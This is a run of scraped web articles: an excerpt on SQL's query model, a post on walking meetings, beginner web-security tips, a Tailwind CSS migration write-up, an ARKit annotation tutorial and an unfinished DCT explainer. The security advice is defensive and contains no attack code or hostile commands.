	</li>
	<li>
		<p>
			Aggregate that relation into the requested ratios.
		</p>
	</li>
</ol>
<p>
	<b>The problem is that <code>Total2019Sales</code> is not part of the Products table.</b> <br>
	It is part of table <code>P</code> from the first example, which is not in the schema.
</p>
<p>
    SQL almost solves this problem with Common Table Expressions, whereby a table is given a temporary name for the rest of the query:
</p>
<pre><code>WITH P AS (
  
<b>-- The subquery from example 1:</b>
  
  SELECT Products.Category, SUM(Orders.Sales) AS Total2019Sales
  FROM Products
  LEFT JOIN Orders ON Products.PId = Orders.PId AND Orders.Year = 2019
  GROUP BY Products.PId)
  
<b>-- Schema tables no longer appear after this line ! --</b>
  
<b>-- The full query from example 2:</b>

SELECT AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END), C.Over50
FROM P 
INNER JOIN (
  SELECT 
    P.Category, 
    AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END) &gt; 0.5 AS Over50
    FROM Products P
    GROUP BY P.Category
  ) C ON P.Category = C.Category
GROUP BY C.Over50</code></pre>
<p>
	I say <em>almost</em>, because we are doing a lot of pretending here. 
</p>
<p>
	The heart of the query is to compute two values for each product: the total sales for that product in 2019, and whether that product belongs to a category where over 50% of products reached their targets in 2019.
</p>
<p>
	The proper way to model <em>«two values for each product»</em> in a database schema is to add two columns to the Products table. 
</p>
<p>
	However, SQL does not support adding columns to a table in the middle of a SELECT query—modeling data and querying data are two completely independent modes in SQL. Instead, we settle for the next best thing: to create a <em>clone</em> of the Products table, which contains all the columns from the original, plus our additional two columns. This is achieved by a left-join-then-group-by (for&nbsp;<code>Total2019Sales</code>) or by an inner-join (for&nbsp;<code>Over50</code>). 
</p>
<p>
	This is a dirty hack ! It does not express the <em>intent</em> behind the operation: that the new table should be the <code>Products</code> table with additional columns. It's easy to make a mistake that drops products or introduces duplicate lines for some products: using an inner-join instead of a left-join, or the wrong keys for a group-by, or a misplaced <code>WHERE</code>. This is compounded by the fact that foreign keys (and other consistency checks) are no longer present or enforced on the clone. 
</p>
<p>
	A complex report might involve five or six tables, and add tens of variables to each of them. It's possible to reach a hundred table clones, each clone an opportunity to make a mistake.
</p>
<p>
	Picture a 200-line SQL query. No tables from the schema appear after line 10, except that one on line 190 which is joined on a column that may or may not still be a foreign key. There are five tables named <code>Products</code> (or some variation thereof), some of which might represent of <em>«the table of all products»</em>, though three of them look like they might have dropped some products from the original table, and a fourth is based on a suspicious <code>INNER JOIN</code> that could duplicate a few lines.
</p>
<h3>A different model</h3>
<p>
	Not many people complain about this. Developers—those who have a strong background in other programming languages, and can realize how silly this all is—tend to hide SQL queries behind an Object-Relational Mapper, or write very small transactional queries that are more concerned about traversing a graph of relations. Data analysts—those who need to write elaborate SQL queries, involving complex business logic—often have no point of comparison in terms of language expres­siveness. 
</p>
<p>
	The SQL query model can be improved by adding operations that preserve the schema. In particular, <em>adding a column to a table</em> should be a basic building block. It does not need to <em>actually</em> add the column to the table: it is enough to create a clone (with an absolute guarantee that no lines appear or disappear), and maybe give it the same name as the original (for convenience). The same relational algebra semantics, but wrapped in a different syntax with additional guarantees.
</p>
<p>
	Data Frames are a similar concept. 
</p>
<p>
	Let's think about how such a model would look like. The concept is: 
</p>
<blockquote>
	<p>
		Rather than adding tables to the schema, the query should add columns to schema tables. New tables, when necessary, should remain unnamed and thus of very local scope. 
	</p>
</blockquote>
<p>
	Common operations add columns to schema tables and guarantee that no rows are added or dropped. 
</p>
<ul>
	<li>
		<p>
			A <b>map</b> stays in the same table, applying a line-by-line operation to compute one new value for each row. 
		</p>
		<div><pre>Products.TargetReached = Products.Total2019Sales &gt;= Products.Target</pre></div>
		<p>
			After the assignment, the <code>Products</code> table is still the table of all products.
		</p>
	</li>
	<li>
		<p>
			A <b>contraction</b> (borrowing the term from <a href="https://en.wikipedia.org/wiki/Tensor_contraction">tensors</a>) performs an aggregation into an output table that already exists, along a one-to-many relation. In terms of SQL, this would be a <code>LEFT JOIN</code> between the output table and the input table (so there are no missing lines), followed by a <code>GROUP BY</code> the primary key of the output table (so there are no duplicates). 
		</p>
		<div><pre>Products.Total2019Sales = sum(Orders.Quantity) where Orders.Year == 2019</pre></div>
		<p>
			Since fewer tables are created in this model, most operations involve schema tables, making it possible to rely more on natural joins (above, between <code>Products</code> and <code>Orders</code>) to shorten the code. 
		</p>
		<p>
			Also, <code>ratio(myBool)</code> as a shorthand for <code>avg(myBool ? 1 : 0)</code> should be standard SQL.
		</p>
	</li>
	<li>
		<p>
			A <b>broadcast</b> (again, from <a href="https://pytorch.org/docs/stable/notes/broadcasting.html">tensors</a>) pulls data through a many-to-one relation. In terms of SQL, this would be an <code>INNER JOIN</code> with a foreign-primary key pair (the foreign key ensures that the join finds at least one row per row, the primary key ensures that it finds no more than one row). 
		</p>
		<div><pre>Products.Over50 = Categories.Over50</pre></div>
		<p>
			Natural joins make this quite short.
		</p>
	</li>
	<li>
		<p>
			A <b>seek</b> is a broadcast which uses a primary key, but not a corresponding foreign key (and thus, a <code>LEFT JOIN</code> instead of an <code>INNER JOIN</code>). There is still a guarantee that there will be one value per row in the table, but some of these values will be null.
		</p>
	</li>
	<li>
		<p>
			New tables, if named, should fit into the schema. They should come with appropriate defaults for primary and foreign keys, and should support adding new keys as necessary.
		</p>
		<div><pre>table Categories = by Products.Category
Categories.Over50 = …</pre></div></li></ul></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main"><article id="post-633"><div><div><p>Let’s face it, we’ve all been spending a lot of time sitting in front of Zoom meetings and it’s kinda dumb. There’s an easy fix and there’s research that it not only makes us a little more creative, it makes us a lot more creative.</p><p>When you’re trapped in an office, I get it. But so many people are working from home and yet they’re stuck doing the same thing over and over again.</p><p>Let’s mix it up…. Grab your phone, headphones and go for a walking meeting.</p><h3>Why are Zoom meetings so exhausting?</h3><ul><li>We are tuned to watching body language</li><li>Tuned to eye contact</li><li>Constantly scanning for where to look</li><li>In a meeting you can catch glances, share a moment and have little side-bar conversations.</li></ul><p>Online meetings don’t really let you do that.</p><ul><li>Looking for eye-contact but you can’t find it.</li><li>Looking for micro-expressions but they are harder to see</li><li>When we’re on video chat we’re always looking at people’s eyes and if they aren’t looking at us, we think they’re ignoring us. Humans are just wired that way.</li><li>And sometimes the audio is just a little out of sync from people’s lips and it drives our brains crazy.</li></ul><p>Don’t get me wrong. I’m a big proponent of turning on the video camera and I think Zoom is a great tool, but everything in moderation and staying in this type of zone all day is mentally draining.</p><h3>Walking Meetings</h3><p>I’ve been doing walking meetings for years and walking literally gets you to change your perspective. When you’re walking you’re more focused and tend to listen better. You’re not fidgeting with your phone or refreshing your newsfeed in another tab.</p><p>Because you’re not focused on trying to match people’s facial expressions you can focus more on what they are saying. There are countless health benefits to walking meetings, but don’t just do this for your physical health. It’s good for your mental health and creativity too.</p><p>I started doing walk &amp; talk meetings about 10 years ago. I’m a big fan of the Show West wing where Aaron Sorkin would take people on a walking journey all while telling a story. The visual cue advances the story and it also gives both sides a chance to talk.</p><p>When I would go on a walking meeting with someone you can’t see their facial expressions so you’re really concentrating on what they are saying.</p><p>The other reason to go for a walk during your meetings is that it can make you more creative. A lot more creative. According to a study out of <a href="https://news.stanford.edu/2014/04/24/walking-vs-sitting-042414/">Stanford</a>, it can increase your creativity by as much as 60% for tasks where you’re thinking of novel ideas.</p><p>They studied the effect of walking on creativity and it doesn’t even have to be walking outside. They got the same results from walking on a treadmill.</p><figure><blockquote><p>So if you’re feeling burned out on Zoom meetings, know that it’s how your brain is wired. Grab your phone, mask, headphones and go for a walk.</p></blockquote></figure><figure><p> <iframe title="Why Walking Meetings Boost Creativity" width="580" height="326" data-src="https://www.youtube.com/embed/mHVfCU90EDc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure></div></div></article></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    















<p><strong>Disclaimer:</strong> I am not a security expert.</p>
<p>This post is a collection of quick tiny little things that could improve your security drastically. We would have a much safer web if more developers would know some of these resources and tips.</p>
<h2 id="use-a-checklist">Use a checklist</h2>
<p>This might sound a bit weird, but checklists are a great and powerful tool.</p>
<p>Ever heard of the <a href="https://www.who.int/patientsafety/safesurgery/checklist/en/">Surgical Safety Checklist from the WHO</a>? In their study, this checklist reduced the morbidity rate of patients by almost 50% <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.
This effectiveness will also apply to WebSecurity.</p>
<p>You will forget or don’t even know about some vulnerabilities. I recommend the <a href="https://cheatsheetseries.owasp.org/Glossary.html">OWASP Cheatsheet Project</a>. The usefulness of this project is incredible. For one of my own <a href="https://likeknob.com/">Web-Apps</a>, I forgot to install a CSRF Protection but saw them on the Cheatsheet.</p>
<p>I personally forgot to implement a CSRF protection for certain actions in <a href="https://likeknob.com/">my Web-App</a>.</p>
<h2 id="your-users-are-evil">Your users are evil</h2>
<p>Or you should at least pretend so. Never trust any input that comes from your users. Imagine them as hackers.</p>
<p>This will put you in the right mindset.</p>
<p>Some of the <a href="https://owasp.org/www-project-top-ten/">most common vulnerabilities</a> come from improper input handling.</p>
<p>Can you put restrictions on the input of your web app? Then do it. The stricter the better.</p>
<p>This also accounts for strange things like: Does your App accept a 1GB big JSON file?</p>
<p>Considering strange inputs, here is a <a href="https://github.com/minimaxir/big-list-of-naughty-strings/">list of strings</a> which may break some applications. And you may test if that also breaks your app.</p>
<p>Additionally, ask yourself: “How would I hack my own app?”</p>
<h2 id="log--monitor-things">Log &amp; Monitor things</h2>
<p>This is also a great point from a non-security perspective. You should always know when something is wrong.</p>
<p>Only if you know something is wrong, you can fix it. I will again recommend a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">OWASP Cheatsheet about Logging</a>.</p>
<p>If you noticed a security incident, be open to your users. Don’t try to hide something.</p>
<p>Being open about such incidents is important and builds trust. In most cases you are also legally required (<a href="https://gdpr-info.eu/art-34-gdpr/">GDPR Art. 34</a>) to inform your users.</p>

<p>So, you tried your best to secure your app. Most likely there will be still vulnerabilities in there.</p>
<p>For this reason: Make it easy for security researchers to reach out to you.</p>
<p>Signal them you will not go after them if they didn’t break any laws. There is a high chance many security researchers will not search or report vulnerabilities because they are afraid of legal retaliation.</p>
<p>So, how do you do that?</p>
<ul>
<li>
<p>Provide a Responsible Disclosure Policy.</p>
<p>In short, it states what security researchers are allowed to test and where to report them.</p>
<p>Bugcrowd (one of the biggest bug bounty platforms) provides a framework for <a href="https://github.com/bugcrowd/disclosure-policy">creating such a policy</a> and a <a href="https://www.bugcrowd.com/resource/what-is-responsible-disclosure/">more in-depth article about Responsible Disclosure Policies</a></p>
</li>
<li>
<p>Provide a security.txt file.</p>
<p>This is a <a href="https://securitytxt.org/">standard proposed by a security researcher</a>.</p>
<p>It’s basically a text file that states where you can disclose security vulnerabilities and how. You can create it easily via <a href="https://securitytxt.org/">the official website</a>.</p>
</li>
<li>
<p>Provide a <code>security@example.com</code> mail address.</p>
<p>Many researchers try this first.</p>
<p>If it fails, there is a lower chance a vulnerability will be reported to you.</p>
</li>
</ul>
<p>If you don’t have any of these, it’s like a sign “No Good Hackers allowed here.”</p>
<p>If you want to read more about why we need more hackers, there is an excellent article <a href="https://medium.com/@yakko.majuri/the-internet-is-too-unsafe-we-need-more-hackers-c9742fc1a03b">here</a>.</p>
<h2 id="last-words">Last words</h2>
<p>Security is hard. It takes time and work to do things more securely.</p>
<p>For the sake of a better web, try it.</p>
<p>We need more hackers that hack for good and more people that are aware of those pitfalls.</p>
<p>Further recommendation:</p>
<p>There are also techniques to write more secure code. I’ve heard good things about the book “Secure by Design” from Deogun, Johnsson, and Sawano.</p>
<p>Take a look at a <a href="https://henrikwarne.com/2020/03/22/secure-by-design/">good summary</a>.</p>
<p><strong>Got a website? I would be happy if you take a look at my <a href="https://likeknob.com/">new Project</a>.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Let's face it - sometimes CSS can be a pig. You need to learn the magic incantations, carefully follow the phases of the moon, and pray that everything will be ok if you just try every possible permutation of the flexbox properties.</p>
<p>But that's not what this post is about. This post isn't about the pain that can come from getting CSS do your bidding, this post is about the pain that comes from trying to <em>scale</em> CSS in a large project. This is the first of a series of posts as we search for the solution that allows our developers to spend more time working on new features and less time writing CSS.</p>
<p>We'll take a look at <a target="_blank" href="https://tailwindcss.com/">Tailwind CSS</a> and see if it fits the bill. </p>
<p><strong>Spoiler alert:</strong> it's easy to get up and running with Tailwind and it feels highly productive. But it's too soon to tell if we'll go all-in with it. A follow-up is needed to investigate Tailwind's facilities for responsive design and accessibility.</p>

<p>We're building <a target="_blank" href="https://kitemaker.co/">Kitemaker</a>, a new, fast, and highly collaborative alternative to issue trackers like Jira, Trello, and Clubhouse. We're helping teams build better products and have a bigger impact through closer collaboration. It's a pretty big React application, and from day one we've used SASS for our CSS needs. We use CSS modules. We haven't used any off-the-shelf component toolkit (some regrets about that). We support dark mode (awesome!) by making heavy use of <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS custom properties</a>. We took a cue from Notion and use system fonts everywhere. We have some <a target="_blank" href="https://sass-lang.com/documentation/at-rules/mixin">@mixin</a> directives for repeated patterns in our UI and occasionally make use of SASS' <a target="_blank" href="https://sass-lang.com/documentation/at-rules/extend">@extends</a> facilities (though we always suspect we're doing it wrong when we do).</p>

<p>Sounds ok. So what's the problem?</p>
<p>The problem is our CSS has become a mess over time. We have tons of classes. Some of them are very specific to the use case in a particular piece of the UI, some are written to be more general and reusable. Sometimes a class isn't quite right for a use case, so it gets duplicated and edited. Sometimes a mixin isn't quite right for the use case so it gets another parameter added to it. Sometimes a new custom property slips in and we get inconsistent colors or borders. We have a lot of SASS variables to handle spacing (padding/margins) and it's not always obvious which one to pick.  Sometimes a developer innocently changes a color here, or a custom property there, fixing their use case but breaking another. We have a hierarchy of CSS classes, but those can be brittle and a challenge for reuse, and in some cases a big surprise where you need to open web inspector and ask "where did this color <em>come</em> from?".</p>
<p>The net result is that we spend too much time tweaking CSS and rarely is the codebase left in a better condition than it was found.</p>
<p>Now, the pundits may say that it's simply because we're not good enough or disciplined enough at CSS - that we don't apply the same rigor to CSS that we apply to the TypeScript and React code that houses it. That may be. We're probably never going to be masters that make amazing works of art with CSS (you should seriously check out <a target="_blank" href="https://twitter.com/liatrisbian">@liatrisbian</a> or <a target="_blank" href="https://twitter.com/jh3yy">@jh3yy</a> if that's what you're after). But here's the thing - we don't think we should need to be. We think it should be able to crank out UIs at a reasonable pace without generating a pile of CSS debt in the process.</p>

<p>What, exactly are we looking to get out of a CSS framework?</p>
<ul>
<li>Something that makes it easy to be consistent in terms of things like margins, padding, colors and sizes.</li>
<li>Something that's customizable enough for our needs</li>
<li>Something that works with our home grown components</li>
<li>Something that doesn't make it harder to support dark mode</li>
<li>Something that helps us make our app more responsive. We were just about to go through all of our app and make it work better on smaller screens, so something that'll kick start the process would be a massive win</li>
<li>Something that helps (or at least doesn't hinder) accessibility</li>
<li>Something that doesn't make our build process even more cumbersome</li>
<li>And last, but not least - something that <em>feels</em> right. We want to come out of this feeling more productive than we are going in when it comes to developing UIs.</li>
</ul>
<p>Let's see if Tailwind CSS is what we're looking for or not!</p>

<p>Ok, so what is <a target="_blank" href="https://tailwindcss.com/">Tailwind CSS</a>? It's a CSS framework that allows you to compose low-level utility classes together right in your HTML (or JSX). It's the rising star among the frameworks that have been referred to as <a target="_blank" href="https://www.smashingmagazine.com/2013/10/challenging-css-best-practices-atomic-approach/">atomic CSS</a> (or functional CSS).</p>
<p>What do these low-level classes look like? Well, they're things like:</p>
<ul>
<li><code>font-bold</code> - add bold font</li>
<li><code>text-gray-600</code> - gray text (the 600 represents the darkness of the gray, ranging from 100 to 900)</li>
<li><code>md:flex</code> - set <code>display: flex</code> on medium sized screens (the <code>md:</code> prefix is part of Tailwind's responsiveness support)</li>
<li><code>hover:underline</code> - underline the contents on hover</li>
</ul>
<p>Everything from colors, to flexbox and grid, to background images. You take these things and compose them together to get the look you're after. So if you want your button to be blue, have a bit of padding, have rounded corners, have bold white text, and to change to a darker blue on hover, you'd write something like this:</p>
<pre><code><span>&lt;<span>button</span> <span>class</span>=<span>"bg-blue-400 p-2 rounded text-white font-bold hover:bg-blue-600"</span>&gt;</span>Click me<span>&lt;/<span>button</span>&gt;</span>
</code></pre>
<p>That's it. No opinions on what a button (or any other component) needs to look like, how your grid system works or anything like that.</p>
<p>Now of course, typing out all of those things can get a bit repetitive, so you <em>can</em> extract things into higher order component classes like this:</p>
<pre><code><span>&lt;<span>button</span> <span>class</span>=<span>"btn btn-blue"</span>&gt;</span>
  Click me
<span>&lt;/<span>button</span>&gt;</span>

<span>&lt;<span>style</span>&gt;</span><span>
  .btn {
    @apply font-bold p-2 rounded;
  }
  .btn-blue {
    @apply bg-blue-400 text-white font-bold;
  }
  .btn-blue:hover {
    @apply bg-blue-600;
  }
</span><span>&lt;/<span>style</span>&gt;</span>
</code></pre>
<p>You can also extend it with your own screen sizes, colors and more. It's pretty neat!</p>
<p>Now, a lot of people's first instinct (and I'm no different) is that this looks like it's going to be at <em>least</em> as messy as the situation we're coming from (if not more). However, there's a real glimmer of hope and that's that things are extremely <em>explicit</em>. The classes you add are the ones you get and if you're careful to not overdo trying to make everything into components, things just might work out. Let's give it a go, shall we?</p>

<p>We're going to put Tailwind CSS to the test by reimplementing a piece of our app. And what better piece than the very first one users are greeted with - the login screen.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598427808597/2X0hmWt0f.png?auto=format&amp;q=60" alt="Screen Shot 2020-08-25 at 17.37.23.png"></p>
<p>We were going to test it by making a mock project and trying to reproduce the screen there, but then we thought - eh, let's live a little. We'll make the changes right in the real codebase. Let's just start by deleting all of the <code>className</code> properties from the existing code. The result:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598427833001/p0rhW63dI.png?auto=format&amp;q=60" alt="Screen Shot 2020-08-25 at 20.24.13.png"></p>
<p>Somewhat less good.</p>
<p>We've got a bit of work to do! We won't go through every step it took to build things back up to their former glory, but let's check out some of the highlights.</p>
<h2 id="installing-tailwind">Installing Tailwind</h2>
<p>Getting Tailwind up and running in our existing webpack setup was surprisingly easy:</p>
<pre><code>yarn add -D postcss-loader tailwindcss
npx tailwindcss init
</code></pre>
<p>Then a little modification to our CSS rule in webpack.config.js:</p>
<pre><code><span>const</span> cssRule = {
  test: <span>/\.css$/i</span>,
  use: [
    ...
    {
      loader: <span>'postcss-loader'</span>,
      options: {
        ident: <span>'postcss'</span>,
        plugins: [<span>require</span>(<span>'tailwindcss'</span>), <span>require</span>(<span>'autoprefixer'</span>)],
      },
    },
        ...
  ],
};
</code></pre>
<p>Rather than muck with our existing SASS files (and all the CSS module cruft that came along with them), we'll just add a brand new CSS file containing:</p>
<pre><code>@<span>tailwind</span> base;
@<span>tailwind</span> components;
@<span>tailwind</span> utilities;
</code></pre>
<p>Add a <code>&lt;link&gt;</code> for this new file in our HTML entry point and that was it. Pretty awesome!</p>
<h2 id="do-yourself-a-favor-install-the-intellisense-plugin">Do yourself a favor - install the IntelliSense plugin</h2>
<p>If you're using VS Code, get this thing immediately:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598428923839/zYTSOVZOs.png?auto=format&amp;q=60" alt="Screen_Shot_2020-08-25_at_21.36.40.png"></p>
<p>Especially when you're first learning, it makes exploring what's available much easier.</p>
<h2 id="start-with-something-easy-buttons">Start with something easy - buttons</h2>
<p>Styling our button component was pretty easy indeed. Our button component has an <code>intent</code> property that controls the button's appearance (e.g. primary, secondary, danger, etc.). So wiring it up with Tailwind looks like:</p>
<pre><code><span>const</span> intentStyles = {
  <span>default</span>: <span>''</span>,
  primary: <span>'bg-blue-500 active:bg-blue-700 hover:bg-blue-300 text-white'</span>,
  secondary: <span>'text-blue-500 bg-none border border-blue-500 active:bg-blue-700 hover:bg-blue-300'</span>,
  danger: <span>'bg-red-500 active:bg-red-700 hover:bg-red-300 text-white'</span>
};

<span>return</span> (
  <span><span>&lt;<span>button</span>
    <span>className</span>=<span>{cn('rounded-sm</span> <span>py-2</span> <span>px-3</span> <span>border-0</span>', <span>intentStyles</span>[<span>intent</span> ?? '<span>default</span>'])}
    <span>...</span>
  &gt;</span>
    ...
  <span>&lt;/<span>button</span>&gt;</span>
)</span>;
</code></pre>
<p>With that in place, our button starts to look pretty button-ish!</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598427916574/VaT_ilfvc.gif?auto=format,compress&amp;gif-q=60" alt="ezgif-6-ed728fe71416.gif"></p>
<p>This was all straightforward - basically just reproducing our existing CSS with Tailwind's utility classes. Needed to check the documentation fairly frequently, but that's fine as it's well structured and readable.</p>
<p>At first glance, developing this way looks (and feels) a bit verbose and awkward. We've always been taught to try to keep our presentation separate from our logic. This will take some getting used to! However, it's great that there are no surprises, no hierarchies to worry about and no thinking about "what's a good name for this class?". Let's push on a bit further.</p>
<h2 id="but-those-arent-the-right-colors">But those aren't the right colors</h2>
<p>Yeah, so we cheated a bit and just used <code>bg-blue-500</code> and friends. Not what we really want. Our old SASS code had things like this:</p>
<pre><code>color: <span>var</span>(--accent-color);
</code></pre>
<p>That's a CSS custom property (variable) which we rely on to make dark mode work. How are we going to get Tailwind to spit that out for us?</p>
<p>Turns out it pretty easy. First we need to modify our tailwind.config.js file to tell Tailwind about our custom color extensions:</p>
<pre><code><span>module</span>.exports = {
  ...
  theme: {
    extend: {
      colors: {
        accent: {
          <span>default</span>: <span>'var(--accent-color)'</span>,
          hover: <span>'var(--accent-color-hover)'</span>,
          pressed: <span>'var(--accent-color-pressed)'</span>,
        },
        danger: {
          <span>default</span>: <span>'var(--danger-color)'</span>,
          hover: <span>'var(--danger-color-hover)'</span>,
          pressed: <span>'v…</span></code></pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><h2 id="288b"><strong>Adding augmented reality</strong></h2><p id="75c4">Our <code>ViewController</code> is responsible for looping calls of the object detection service and placing annotations whenever an object is recognized. Moreover, the controller increases the accuracy with which annotations are of placed—it doesn’t allow you to place an annotation if the device is moving, the object is too far from the camera, etc.</p><p id="b2f8"><em>The </em><code><em>ViewController</em></code><em> seems a bit overloaded—I would recommend splitting responsibilities into different classes.</em></p><blockquote><p id="803f">In order to keep the tutorial short and clear, I won’t explain the boilerplate code needed to run the AR session. Let’s dive deep into the annotation-related logic!</p></blockquote><h2 id="bd79"><strong>Looping object detection</strong></h2><p id="dcab">To make automatic annotation, we need to persistently loop the process of getting a snapshot of the current frame and sending it to the detection service.</p><figure><div></div></figure><p id="9195">In this code example, you can see the recursion with slight improvements. It uses throttling to do this.</p><blockquote><p id="4f53">Throttling — the mechanism that ensures a function is called at most once every defined time period (for our case, every 1 second).</p></blockquote><p id="c456">As you might have noticed, <code>performDetection</code> runs only when <code>isDetectionEnabled</code> is set to <code>true</code>—this property brings the most performance and accuracy improvements.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1494/1*O2bkepwwwm0G4PRE_Hj8xw.png" width="747" height="522" srcset="https://miro.medium.com/max/552/1*O2bkepwwwm0G4PRE_Hj8xw.png 276w, https://miro.medium.com/max/1104/1*O2bkepwwwm0G4PRE_Hj8xw.png 552w, https://miro.medium.com/max/1280/1*O2bkepwwwm0G4PRE_Hj8xw.png 640w, https://miro.medium.com/max/1400/1*O2bkepwwwm0G4PRE_Hj8xw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*O2bkepwwwm0G4PRE_Hj8xw.png?q=20"></p></div></div></div></figure><p id="8a19">By conforming to the <code>ARSessionDelegate</code> protocol, the controller can track all changes in the current AR session. There are many cases where, in a particular state, we don’t need to run object detection, so we set <code>isDetectionEnabled</code> to <code>false</code>(e.g when AR tracking is limited, initializing is happening, or there is no surface detected). This view controller implements all methods from <code>ARSessionDelegate</code>, and these methods calls <code>onSessionUpdate</code>, which determines the session state and considers whether detection should continue.</p><h2 id="be20"><strong>Device movement</strong></h2><p id="4f07">Take a closer look at the speed limiter. When the device is moving too fast, it adversely affects annotation accuracy. In <code>func session(_ session: ARSession, didUpdate frame: ARFrame)</code> we implement logic that tracks device motion and sets <code>isDetectionEnabled</code> to <code>false</code> whenever the user drives over the speed limit.</p><figure><div></div></figure><p id="9157">Here, we just take the camera node’s position relative to the scene’s world coordinate space and compare it with the previous location, and if the speed over <strong>0.0025</strong> coordinates per frame, detection will be terminated by setting <code>isDetectionEnabled</code><strong> </strong>to <code>false</code>.</p><blockquote><p id="77e3">You may be wondering why 0.0025 is the magic number. This is just the speed value that was determined as optimal for this app by dozens of tests of annotation accuracy. You can tune this value to experiment, as well.</p></blockquote><h2 id="fd14"><strong>Object detection</strong></h2><p id="20f0">When all complex requirements of accuracy and performance are satisfied, finally, it’s time to turn to our object detection model.</p><figure><div></div></figure><ol><li id="b951">Here, we take a snapshot of the current <code>ARFrame</code> and send it to the object detection service. Then we just wait for the callback.</li><li id="e8d1">When the callback is called with success, we need to convert the normalized rect of the recognized object to <code>sceneView</code> size. Thankfully, all the complicated math is done by the <code>VNImageRectForNormalizedRect</code> function.</li><li id="2b0a">And the last thing we do is to place an annotation on the scene root node.</li></ol><h2 id="ffdf"><strong>Adding annotations</strong></h2><p id="89d6">Let’s have a look at the <code>addAnnotation</code> method. It places an annotation if possible—take a closer look at following code to see how this is implemented.</p><figure><div></div></figure><p id="6c26">1. In the first step, we exclude the situation when for one detected object, more than one annotation is placed. Instantiate a center point of the recognized object on the screen using <code>sceneView</code>’s coordinate system. The <code>hitTest</code> method searches the renderer’s scene for objects corresponding to a point, and it uses <code>SCNHitTestSearchMode.all</code> in order to find all intersections of the sent ray with nodes. If in the received result it finds a <code>BubbleNode</code> (the actual name of your annotation filtered by node name), the method’s execution ends.</p><p id="b5e6">2. The next step is to find a plane and point in the world system coordinates where the bubble should be placed. This is done by using raycasting methods <code>raycastQuery</code> and <code>raycast(raycastQuery)</code>.</p><blockquote><p id="dfb3"><a href="https://developer.apple.com/documentation/arkit/arscnview/3194595-raycastquery" target="_blank" rel="noopener">Explanation</a> from the official Apple documentation:</p><p id="6ba3">When you call <code>raycastQuery</code>, ARKit creates a ray that extends in the positive z-direction from the argument screen space point, to determine if any of the argument targets exist in the physical environment anywhere along the ray. If so, ARKit returns a 3D position where the ray intersects the target.</p></blockquote><p id="aea0">3. Here, we implement restricting code that doesn’t allow you to place the bubble if it’s too far from the user’s camera—in this example, the maximum distance between an object and the device is 0,5 m. Feel free to tune this value for your particular needs.</p><p id="f518">4. And finally, last but not least, we place the annotation on the <code>rootNode</code> of the scene. Set the <code>worldPosition</code> of the newly-created <code>BubbleNode</code> to the position determined in step 2, and place and add a child node to the <code>rootNode</code>.</p><blockquote><p id="1fde">Using the<strong> </strong><code>prepare</code> method of the <code>ARSceneView</code> instance is one more approach for performance optimization. It prepares objects for rendering using a background thread, and then returns the execution flow to the main thread.</p></blockquote><p id="46be">I’m sure in the future we’ll see more applications that use <strong>CoreML</strong> and <strong>ARKit</strong> together, as <a target="_blank" rel="noopener" href="https://heartbeat.fritz.ai/combining-artificial-intelligence-and-augmented-reality-in-mobile-apps-e0e0ad2cfddc">they complement themselves perfectly</a>. I believe that the new evolution branch of UX starts here. See you later!</p></div></div></section></div>]]>

For those who don’t know, its a game where a person chooses an item in a room in his mind and the others have to guess it by asking questions (like 20 questions).</p><p>Now, let’s assume that I think of a painting of a boat hanging on the wall and ask a 5 year old to ask questions and guess what I am thinking of.</p><p>For the sake of this example, lets tweak the rules and provide the 20 clues ourselves.</p><p>The best clue that we can provide is something like this “the item is hanging on the wall opposite the door”. This is guaranteed to lead the kid close to the prize, right?</p><p>The next best clue would be something like “the item is a square or box-shaped”. After that, we could say something like “it has an ocean and a boat in it.”.</p><p>If you do this carefully, you don’t need 20 clues to guide the kid to the painting – in all likelihood, 5 - 8 clues would suffice. And, by now, you would have realized that some of the clues can lead the kid to the answer faster than the other clues - this is an indication to the amount of information those clues hold within them.</p><p>Time to pause and consider what we have done so far.</p><p>So, what you’ve done is,</p><ul><li>taken some data as input (the location of a painting),</li><li>converted it into a set of 20 clues (output),</li><li>arranged the clues in order of importance (how much information does the clue contain),</li><li>and shown that just a few of the clues can capture the location of the painting while the rest of them add details to the puzzle.</li></ul><p>This is in essence what the DCT does.</p><p>It takes data in one form, converts it to another form such that the output data is arranged in order of importance. This allows us to throw away most of the output data and still be able to get back to the original data.</p><p>I hope you understood what the DCT is trying to achieve (in essence).</p><p><strong>Because, the kid gloves have to come off now and the ELI5 ends here :) The remaining sections require high school math and some understanding of programming - preferably in MATLAB or Octave.</strong></p><h2 id="introducing-the-discrete-cosine-transform">Introducing the Discrete Cosine Transform</h2><p>The Discrete Cosine Transform or DCT is a widely used transform for image and video compression. It’s definition as per Wikipedia is as follows :-</p><blockquote><p>The Discrete Cosine Transform expresses a finite sequence of data points in terms of a sum of cosine functions oscillating at different frequencies.</p></blockquote><p>Still with me? Don’t worry about the math behind the DCT for now.</p><p>In simpler terms, the Discrete Cosine Transform takes a set of <code>N</code> correlated (similar) data-points and returns <code>N</code> de-correlated (dis-similar) data-points (coefficients) in such a way that the energy is compacted in only a few of the coefficients <code>M</code> where <code>M &lt;&lt; N</code>.</p><p>If that doesn’t make sense, try and remember this - the DCT takes input data and converts it to another domain while doing two very important things -</p><ol><li><strong>it de-correlates the data (removes any relation or similarity between the data points)</strong></li><li><strong>it compacts the energy/information into only a few of the output data points</strong></li></ol><p>To summarize, the 